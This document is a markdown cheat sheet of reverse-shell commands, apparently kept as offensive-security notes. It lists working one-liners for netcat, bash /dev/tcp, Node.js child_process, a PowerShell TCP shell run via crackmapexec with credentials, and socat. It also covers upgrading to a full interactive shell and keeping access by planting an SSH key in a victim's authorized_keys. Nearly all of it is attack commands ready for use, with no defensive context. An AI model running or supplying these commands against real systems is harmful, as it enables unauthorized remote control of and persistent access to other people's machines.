# Shells

## Netcat (nc)  

Some version of netcat do not have the `-e` switch avaiable.  On these you can pipe the commands into netcat.  

Server:
```
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT  > /tmp/f
```
Client:  
`nc -lvp PORT`

## Bash  
`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`  

## Node.js  
`require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/192.168.49.170/80+0>%261"')`

## Crackmapexec with Powershell
```
crackmapexec smb -d . -u <user> -p '<password>' -X "$c = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()" <RHOST>
```
  
# Upgrading to Interactive Shells

## Simple upgrades  
Python  
`python -c 'import pty;pty.spawn("/bin/bash")'`  

Script  
```
exec script /dev/null      
Script started, file is /dev/null    
bash
```

Socat  
Listener:  
```socat file:`tty`,raw,echo=0 tcp-listen:<PORT>```

Victim:  
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LISTENER_IP>:<PORT>`  

## Upgrading to full interactive shell  
**In existing reverse shell**  
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z   
```

Attacker  
```
stty raw -echo  
fg  
```
in zsh  
```
stty raw -echo; fg <enter><enter>
```

Victim  
```reset 
export SHELL=bash  
export TERM=xterm-256color  
stty rows <num> columns <cols>  
``` 
**SSH**  


1. Create a .ssh directory in the home directory of the compromised user.
2. Create a new keypair on the attacker machine using `ssh-keygen` 
3. Transfer the public key to the victim machine at save in the .ssh folder as `authorized_keys`
4. Apply the appropriate file permissions  
```
chmod 0700 /home/user/.ssh  
chmod 0644 /home/user/.ssh/authorized_keys
```
6. SSH into the system using the private key.
